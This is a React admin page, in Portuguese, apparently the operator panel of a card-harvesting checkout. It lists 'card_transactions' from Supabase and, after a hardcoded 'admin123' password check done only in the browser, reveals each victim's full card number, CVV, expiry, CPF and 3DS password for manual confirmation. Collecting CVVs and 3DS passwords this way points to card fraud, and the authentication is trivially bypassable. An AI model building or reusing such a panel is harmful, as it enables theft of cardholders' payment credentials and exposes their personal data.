import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Eye, EyeOff, Check, X, RefreshCw, CreditCard, Loader2, Lock } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

type Transaction = {
  id: string;
  token: string;
  holder_name: string;
  cpf: string;
  card_brand: string;
  card_last4: string;
  card_number: string;
  card_cvv: string;
  card_expiry: string;
  plan_label: string;
  quantity: number;
  amount: number;
  coupon: string | null;
  customer_name: string;
  customer_phone: string;
  address: string | null;
  status: string;
  created_at: string;
  processed_at: string | null;
  threeds_password: string;
};

const ADMIN_PASSWORD = "admin123";

const ToggleField = ({ label, masked, real }: { label: string; masked: string; real: string }) => {
  const [visible, setVisible] = useState(false);
  return (
    <p className="flex items-center gap-1.5 text-sm">
      <strong>{label}:</strong> {visible ? real : masked}
      <button onClick={() => setVisible(!visible)} className="ml-1 text-muted-foreground hover:text-foreground transition-colors">
        {visible ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
      </button>
    </p>
  );
};

const AdminCartoes = () => {
  const [authenticated, setAuthenticated] = useState(false);
  const [loginPassword, setLoginPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [loading, setLoading] = useState(true);
  const [filter, setFilter] = useState<"pending" | "all">("pending");
  const [viewTx, setViewTx] = useState<Transaction | null>(null);
  const [showData, setShowData] = useState(false);
  const [passwordInput, setPasswordInput] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [askingPassword, setAskingPassword] = useState(false);
  const { toast } = useToast();

  const fetchTransactions = async () => {
    setLoading(true);
    let query = supabase
      .from("card_transactions" as any)
      .select("*")
      .order("created_at", { ascending: false });

    if (filter === "pending") {
      query = query.eq("status", "pending");
    }

    const { data, error } = await query;
    if (error) {
      console.error(error);
      toast({ variant: "destructive", title: "Erro", description: "Erro ao carregar transações" });
    }
    setTransactions((data as unknown as Transaction[]) || []);
    setLoading(false);
  };

  useEffect(() => {
    fetchTransactions();
  }, [filter]);

  const updateStatus = async (id: string, status: "confirmed" | "rejected") => {
    const { error } = await supabase
      .from("card_transactions" as any)
      .update({ status, processed_at: new Date().toISOString() })
      .eq("id", id);

    if (error) {
      toast({ variant: "destructive", title: "Erro", description: "Erro ao atualizar" });
    } else {
      toast({ title: status === "confirmed" ? "Transação confirmada" : "Transação rejeitada" });
      fetchTransactions();
      if (viewTx?.id === id) setViewTx(null);
    }
  };

  const handleView = (tx: Transaction) => {
    setViewTx(tx);
    setShowData(false);
    setPasswordInput("");
    setPasswordError("");
    setAskingPassword(false);
  };

  const handleReveal = () => {
    setAskingPassword(true);
  };

  const handlePasswordSubmit = () => {
    if (passwordInput === ADMIN_PASSWORD) {
      setShowData(true);
      setAskingPassword(false);
      setPasswordError("");
    } else {
      setPasswordError("Senha incorreta");
    }
  };

  const formatCpf = (cpf: string) => {
    if (cpf.length === 11) return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    return cpf;
  };

  const maskCpf = (cpf: string) => {
    if (cpf.length === 11) return `${cpf.slice(0, 3)}.***.**${cpf.slice(9)}-${cpf.slice(9, 11)}`;
    return "***.***.***-**";
  };

  const formatCardNumber = (n: string) => n.replace(/(.{4})/g, "$1 ").trim();
  const maskCardNumber = (last4: string) => `**** **** **** ${last4}`;

  const formatDate = (d: string) => new Date(d).toLocaleString("pt-BR");

  const statusBadge = (status: string) => {
    const map: Record<string, { bg: string; label: string }> = {
      pending: { bg: "bg-yellow-100 text-yellow-800", label: "Pendente" },
      confirmed: { bg: "bg-green-100 text-green-800", label: "Confirmada" },
      rejected: { bg: "bg-red-100 text-red-800", label: "Rejeitada" },
    };
    const s = map[status] || { bg: "bg-muted", label: status };
    return <span className={`text-xs font-medium px-2 py-0.5 rounded-full ${s.bg}`}>{s.label}</span>;
  };

  const handleLogin = () => {
    if (loginPassword === ADMIN_PASSWORD) {
      setAuthenticated(true);
      setLoginError("");
    } else {
      setLoginError("Senha incorreta");
    }
  };

  if (!authenticated) {
    return (
      <main className="min-h-screen bg-background flex items-center justify-center">
        <Card className="w-full max-w-sm mx-4">
          <CardContent className="pt-6 space-y-4">
            <div className="text-center space-y-2">
              <div className="mx-auto w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center">
                <Lock className="h-6 w-6 text-primary" />
              </div>
              <h1 className="text-xl font-bold text-foreground">Painel Administrativo</h1>
              <p className="text-sm text-muted-foreground">Digite a senha para acessar</p>
            </div>
            <div className="space-y-2">
              <Label htmlFor="adminLogin">Senha</Label>
              <Input
                id="adminLogin"
                type="password"
                placeholder="Senha administrativa"
                value={loginPassword}
                onChange={(e) => { setLoginPassword(e.target.value); setLoginError(""); }}
                onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                className={loginError ? "border-destructive" : ""}
                autoFocus
              />
              {loginError && <p className="text-xs text-destructive">{loginError}</p>}
            </div>
            <Button onClick={handleLogin} className="w-full">
              Entrar
            </Button>
          </CardContent>
        </Card>
      </main>
    );
  }

  return (
    <main className="min-h-screen bg-background">
      <div className="container max-w-5xl px-4 py-8">
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center gap-3">
            <CreditCard className="h-6 w-6 text-primary" />
            <h1 className="text-2xl font-bold text-foreground">Transações com Cartão</h1>
          </div>
          <Button variant="outline" size="sm" onClick={fetchTransactions}>
            <RefreshCw className="h-4 w-4 mr-1" /> Atualizar
          </Button>
        </div>

        <div className="flex gap-2 mb-4">
          <Button variant={filter === "pending" ? "default" : "outline"} size="sm" onClick={() => setFilter("pending")}>
            Pendentes
          </Button>
          <Button variant={filter === "all" ? "default" : "outline"} size="sm" onClick={() => setFilter("all")}>
            Todas
          </Button>
        </div>

        <Card>
          <CardContent className="p-0">
            {loading ? (
              <div className="flex items-center justify-center py-12">
                <Loader2 className="h-6 w-6 animate-spin text-primary" />
              </div>
            ) : transactions.length === 0 ? (
              <div className="text-center py-12 text-muted-foreground text-sm">
                Nenhuma transação encontrada
              </div>
            ) : (
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Cliente</TableHead>
                    <TableHead>Plano</TableHead>
                    <TableHead>Valor</TableHead>
                    <TableHead>Bandeira</TableHead>
                    <TableHead>Token</TableHead>
                    <TableHead>Status</TableHead>
                    <TableHead>Data</TableHead>
                    <TableHead className="text-right">Ações</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {transactions.map((tx) => (
                    <TableRow key={tx.id}>
                      <TableCell className="font-medium text-xs">{tx.customer_name}</TableCell>
                      <TableCell className="text-xs">{tx.plan_label} x{tx.quantity}</TableCell>
                      <TableCell className="text-xs font-mono">
                        {tx.amount.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })}
                      </TableCell>
                      <TableCell className="text-xs capitalize">{tx.card_brand}</TableCell>
                      <TableCell className="text-xs font-mono">{tx.token.slice(0, 12)}...</TableCell>
                      <TableCell>{statusBadge(tx.status)}</TableCell>
                      <TableCell className="text-xs">{formatDate(tx.created_at)}</TableCell>
                      <TableCell className="text-right">
                        <div className="flex items-center justify-end gap-1">
                          <Button variant="ghost" size="icon" className="h-8 w-8" onClick={() => handleView(tx)}>
                            <Eye className="h-4 w-4" />
                          </Button>
                          {tx.status === "pending" && (
                            <>
                              <Button variant="ghost" size="icon" className="h-8 w-8 text-green-600" onClick={() => updateStatus(tx.id, "confirmed")}>
                                <Check className="h-4 w-4" />
                              </Button>
                              <Button variant="ghost" size="icon" className="h-8 w-8 text-red-600" onClick={() => updateStatus(tx.id, "rejected")}>
                                <X className="h-4 w-4" />
                              </Button>
                            </>
                          )}
                        </div>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            )}
          </CardContent>
        </Card>
      </div>

      {/* Detail Dialog */}
      <Dialog open={!!viewTx} onOpenChange={(open) => { if (!open) setViewTx(null); }}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Detalhes da Transação</DialogTitle>
            <DialogDescription>Token: {viewTx?.token}</DialogDescription>
          </DialogHeader>
          {viewTx && (
            <div className="space-y-3 text-sm">
              <div className="grid grid-cols-2 gap-2">
                <div>
                  <p className="text-xs text-muted-foreground">Cliente</p>
                  <p className="font-medium">{viewTx.customer_name}</p>
                </div>
                <div>
                  <p className="text-xs text-muted-foreground">Telefone</p>
                  <p className="font-medium">{viewTx.customer_phone}</p>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-2">
                <div>
                  <p className="text-xs text-muted-foreground">Plano</p>
                  <p className="font-medium">{viewTx.plan_label} x{viewTx.quantity}</p>
                </div>
                <div>
                  <p className="text-xs text-muted-foreground">Valor</p>
                  <p className="font-medium">{viewTx.amount.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })}</p>
                </div>
              </div>

              {viewTx.coupon && (
                <div>
                  <p className="text-xs text-muted-foreground">Cupom</p>
                  <p className="font-medium">{viewTx.coupon}</p>
                </div>
              )}

              {viewTx.address && (
                <div>
                  <p className="text-xs text-muted-foreground">Endereço</p>
                  <p className="font-medium text-xs">{viewTx.address}</p>
                </div>
              )}

              <hr className="border-border" />

              <div>
                <p className="text-xs text-muted-foreground mb-2">Dados do Cartão</p>

                {!showData && !askingPassword && (
                  <div className="space-y-1">
                    <p className="text-sm"><strong>Titular:</strong> {viewTx.holder_name}</p>
                    <p className="text-sm"><strong>CPF:</strong> {maskCpf(viewTx.cpf)}</p>
                    <p className="text-sm"><strong>Cartão:</strong> {maskCardNumber(viewTx.card_last4)}</p>
                    <p className="text-sm"><strong>Bandeira:</strong> <span className="capitalize">{viewTx.card_brand}</span></p>
                    <p className="text-sm"><strong>Validade:</strong> **/**</p>
                    <p className="text-sm"><strong>CVV:</strong> ***</p>
                    <Button variant="outline" size="sm" onClick={handleReveal} className="mt-2">
                      <Eye className="h-3.5 w-3.5 mr-1" /> Revelar dados completos
                    </Button>
                  </div>
                )}

                {askingPassword && (
                  <div className="space-y-2">
                    <p className="text-xs text-muted-foreground">Digite a senha administrativa para visualizar:</p>
                    <Input
                      type="password"
                      placeholder="Senha"
                      value={passwordInput}
                      onChange={(e) => { setPasswordInput(e.target.value); setPasswordError(""); }}
                      className={passwordError ? "border-destructive" : ""}
                      autoFocus
                      onKeyDown={(e) => e.key === "Enter" && handlePasswordSubmit()}
                    />
                    {passwordError && <p className="text-xs text-destructive">{passwordError}</p>}
                    <div className="flex gap-2">
                      <Button variant="outline" size="sm" onClick={() => setAskingPassword(false)}>Cancelar</Button>
                      <Button size="sm" onClick={handlePasswordSubmit}>Confirmar</Button>
                    </div>
                  </div>
                )}

                {showData && (
                  <div className="space-y-2 bg-muted/50 p-3 rounded-lg">
                    <p className="text-sm"><strong>Titular:</strong> {viewTx.holder_name}</p>
                    <ToggleField label="CPF" masked={maskCpf(viewTx.cpf)} real={formatCpf(viewTx.cpf)} />
                    <ToggleField
                      label="Cartão"
                      masked={maskCardNumber(viewTx.card_last4)}
                      real={viewTx.card_number ? formatCardNumber(viewTx.card_number) : maskCardNumber(viewTx.card_last4)}
                    />
                    <p className="text-sm"><strong>Bandeira:</strong> <span className="capitalize">{viewTx.card_brand}</span></p>
                    <ToggleField label="Validade" masked="**/**" real={viewTx.card_expiry} />
                    <ToggleField label="CVV" masked="***" real={viewTx.card_cvv || "---"} />
                    <ToggleField label="Senha 3DS" masked="****" real={viewTx.threeds_password || "---"} />
                    <p className="text-sm"><strong>Token:</strong> <code className="text-xs bg-muted px-1 rounded">{viewTx.token}</code></p>
                  </div>
                )}
              </div>

              <hr className="border-border" />

              <div className="flex items-center justify-between">
                <div>{statusBadge(viewTx.status)}</div>
                {viewTx.status === "pending" && (
                  <div className="flex gap-2">
                    <Button size="sm" variant="outline" className="text-red-600" onClick={() => updateStatus(viewTx.id, "rejected")}>
                      Rejeitar
                    </Button>
                    <Button size="sm" onClick={() => updateStatus(viewTx.id, "confirmed")}>
                      Confirmar
                    </Button>
                  </div>
                )}
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </main>
  );
};

export default AdminCartoes;
